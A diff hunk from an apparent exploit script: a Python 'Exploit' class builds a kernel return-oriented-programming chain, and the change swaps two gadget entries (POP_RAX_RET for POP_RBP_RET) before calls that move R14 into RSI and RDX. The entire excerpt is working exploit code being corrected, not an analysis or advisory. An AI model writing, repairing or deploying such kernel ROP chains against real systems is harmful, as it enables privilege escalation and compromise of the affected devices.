@@ -578,12 +578,12 @@ class Exploit():
 
         # RSI = R14
         rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
         rop += p64(self.kdlsym(self.offs.MOV_RSI_R14_CALL_RAX))
 
         # RDX = R14
         rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
         rop += p64(self.kdlsym(self.offs.MOV_RDX_R14_CALL_RAX))
 
         # RDX = RDX + PAGE_SIZE
